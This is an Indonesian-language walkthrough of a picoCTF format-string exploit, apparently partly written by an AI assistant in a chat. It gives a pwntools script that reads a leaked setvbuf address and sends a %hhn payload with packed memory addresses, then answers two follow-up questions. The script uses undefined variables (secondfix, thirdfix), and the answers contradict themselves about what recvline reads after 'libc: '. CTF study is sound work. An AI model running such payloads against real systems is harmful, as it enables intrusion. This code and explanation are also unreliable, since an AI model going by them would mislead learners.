1. Koneksi ke server:
```python
r = remote('rhea.picoctf.net', 58264)
```
Kode ini membuat koneksi ke server target menggunakan modul `pwntools`.

2. Menerima alamat `setvbuf`:
```python
print(r.recvuntil('libc: '))
setvbuf_addr = r.recvline()
```
Program menerima output dari server sampai string 'libc: ', kemudian membaca alamat fungsi `setvbuf`.

3. Ekstraksi byte-byte penting:
```python
second_byte = (int(setvbuf_addr[:-1], 16) // 256) % 256
third_byte = (int(setvbuf_addr[:-1], 16) // (256 * 256)) % 256
```
Kode ini mengekstrak byte kedua dan ketiga dari alamat `setvbuf`.

4. Perhitungan offset:
```python
second_diff = second_byte - 0xa3
```
Menghitung perbedaan antara byte kedua yang diterima dengan nilai tetap (0xa3).

5. Membangun payload:
```python
prefix = "%03d" % (third_byte - 3)
second_amount = (0x160 - (third_byte - 3)) % 256
third_amount = (0x1f7 - 0x60 + second_diff) % 256
```
Kode ini membangun bagian-bagian dari payload format string.

6. Membuat dan mengirim payload:
```python
payload = "%" + prefix + "u%43$hhn%" + secondfix + "u%45$hhn%" + thirdfix + "u%44$hhnYYYY"
r.sendline(payload + "\x1a\x40\x40\x00\x00\x00\x00\x00\x19\x40\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00")
```
Payload ini menggunakan format string vulnerability untuk menulis ke alamat memori tertentu. `%hhn` digunakan untuk menulis byte tunggal.

7. Interaksi dengan program:
```python
r.interactive()
```
Membuka sesi interaktif dengan program target.

Eksploitasi ini memanfaatkan kerentanan format string untuk memodifikasi alamat memori tertentu, kemungkinan untuk mengubah alur eksekusi program atau memodifikasi nilai-nilai penting dalam memori.

Penting untuk dicatat bahwa ini adalah teknik eksploitasi tingkat lanjut dan hanya boleh digunakan dalam lingkungan yang terkontrol dan legal, seperti dalam konteks CTF (Capture The Flag) atau pengujian keamanan yang sah.


====================================================================================================================================
====================================================================================================================================

print(r.recvuntil('libc: ')) setvbuf_addr = r.recvline()
kenapa ini bisa membaca address dari setvbuf?

Bagus sekali pertanyaannya. Mari kita bahas lebih detail tentang bagian kode ini:

```python
print(r.recvuntil('libc: '))
setvbuf_addr = r.recvline()
```

Kode ini sebenarnya tidak secara langsung "membaca address dari setvbuf". Yang dilakukan adalah:

1. `r.recvuntil('libc: ')`: 
   - Fungsi ini membaca output dari program target sampai menemukan string 'libc: '.
   - Ini mengasumsikan bahwa program target mencetak beberapa informasi, dan salah satunya adalah string 'libc: ' diikuti oleh alamat setvbuf.

2. `setvbuf_addr = r.recvline()`:
   - Setelah menemukan 'libc: ', kode ini membaca satu baris penuh berikutnya.
   - Diasumsikan bahwa baris ini berisi alamat setvbuf yang dicetak oleh program target.

Jadi, kode ini tidak secara ajaib "membaca address dari setvbuf". Sebaliknya, ini memanfaatkan fakta bahwa program target (yang mungkin telah dimodifikasi untuk tujuan CTF atau pembelajaran) secara eksplisit mencetak alamat setvbuf.

Dalam konteks keamanan dan CTF, sering kali program target sengaja dimodifikasi untuk memberikan beberapa informasi yang biasanya tidak akan tersedia, seperti alamat fungsi dalam libc. Ini dilakukan untuk memfasilitasi pembelajaran atau untuk membuat tantangan lebih mudah diselesaikan.

Dalam situasi serangan nyata, Anda biasanya tidak akan mendapatkan informasi seperti ini secara langsung. Teknik-teknik lain seperti memory leaks atau bruteforce mungkin diperlukan untuk mendapatkan informasi semacam ini.

====================================================================================================================================
====================================================================================================================================
print(r.recvuntil('libc: '))
bentar, bagian ini bukan printf kan? libcnya bisa seperti apa? (bisa contohkan)

Anda benar, bagian ini bukan printf. Mari saya jelaskan lebih detail:

1. `print(r.recvuntil('libc: '))`
   Ini mencetak semua output dari program target sampai string 'libc: ' ditemukan.

2. Output 'libc: ' ini kemungkinan besar adalah bagian dari program target yang sengaja dibuat untuk tantangan CTF.

Contoh output yang mungkin dari program target bisa seperti ini:

```
Welcome to the challenge!
Your goal is to exploit this program.
Here's some information to help you:
libc: 0xf7fc1000
```

Dalam contoh ini, '0xf7fc1000' adalah alamat base dari libc yang digunakan oleh program. 

Kenapa ini penting?
- Dalam banyak tantangan exploit, mengetahui alamat base libc sangat membantu karena:
  1. Memungkinkan Anda menghitung offset ke fungsi-fungsi libc lainnya.
  2. Membantu dalam teknik seperti Return-to-libc atau ROP (Return Oriented Programming).

Untuk setvbuf sendiri, kode berikutnya `setvbuf_addr = r.recvline()` mengasumsikan bahwa alamat setvbuf dicetak tepat setelah 'libc: '. Jadi, output lengkapnya mungkin seperti ini:

```
Welcome to the challenge!
Your goal is to exploit this program.
Here's some information to help you:
libc: 0xf7fc1000
setvbuf: 0xf7fc1a83
```

Dimana '0xf7fc1a83' adalah alamat fungsi setvbuf dalam libc.

Penting untuk diingat bahwa dalam situasi nyata, program biasanya tidak akan memberikan informasi sebanyak ini. Ini adalah fitur khusus yang ditambahkan untuk tujuan pembelajaran atau tantangan CTF.






